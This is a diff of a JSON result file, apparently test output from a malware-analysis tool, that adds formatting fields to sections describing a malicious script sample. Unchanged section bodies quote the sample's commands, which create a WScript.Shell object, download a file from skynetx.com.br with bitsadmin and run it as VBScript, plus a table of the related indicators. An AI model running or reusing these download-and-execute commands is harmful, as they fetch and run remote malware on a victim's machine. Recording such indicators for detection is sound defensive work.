@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: WScript.Shell\n\n\t\tActiveXObject(WScript.Shell)\n\n\t\tvar JSpsOzcR = new ActiveXObject(\"WScript.Shell\")",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -39,6 +41,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[12]()\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -61,6 +64,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tWScript.Shell[12].run(\"bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB\", 0, true)\n\n\t\tWScript.Shell[12].run(\"wscript //E:VBScript %Temp%VB\")\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -83,6 +87,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -101,6 +106,7 @@
       {
         "auto_collapse": false,
         "body": "bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -120,6 +126,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"skynetx.com.br\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://skynetx.com.br/info2.txt\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/info2.txt\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 2,
@@ -152,6 +164,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"skynetx.com.br\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://skynetx.com.br/info2.txt\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/info2.txt\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -184,6 +202,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"skynetx.com.br\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://skynetx.com.br/info2.txt\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/info2.txt\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
